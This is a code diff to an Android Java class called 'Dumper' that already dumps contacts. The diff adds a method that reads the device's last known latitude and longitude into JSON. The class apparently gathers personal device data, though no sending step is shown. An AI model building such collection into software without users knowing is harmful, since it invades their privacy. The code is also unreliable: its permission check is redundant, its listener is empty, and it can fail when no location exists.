@@ -5,8 +5,12 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
@@ -22,6 +26,63 @@ import java.util.Properties;
  * Created by doctorrabb on 15.07.16.
  */
 public class Dumper {
+
+    public JSONObject getLocation(Context context) {
+
+        if (ActivityCompat.checkSelfPermission (context, Manifest.permission.ACCESS_FINE_LOCATION)
+                == PackageManager.PERMISSION_GRANTED) {
+
+            final JSONObject jsonObject = new JSONObject();
+
+            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+
+                Log.e("Error Getting Location", "User fucking shit :(");
+
+                return null;
+            }
+
+            locationManager.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER,
+                    1000 * 60 * 1,
+                    10,
+                    new LocationListener() {
+                        @Override
+                        public void onLocationChanged(Location location) {
+
+                        }
+
+                        @Override
+                        public void onStatusChanged(String s, int i, Bundle bundle) {
+
+                        }
+
+                        @Override
+                        public void onProviderEnabled(String s) {
+
+                        }
+
+                        @Override
+                        public void onProviderDisabled(String s) {
+
+                        }
+                    }
+            );
+
+            if (locationManager != null) {
+                try {
+                    jsonObject.put("latitude", String.valueOf(locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER).getLatitude()));
+                    jsonObject.put("longitude", String.valueOf(locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER).getLongitude()));
+                } catch (JSONException e) {
+                    Log.e("GetLocation Error", e.getMessage());
+                }
+            }
+
+
+            return jsonObject;
+        }
+        return null;
+    }
 
     public JSONArray dumpContacts (Context context) {
 
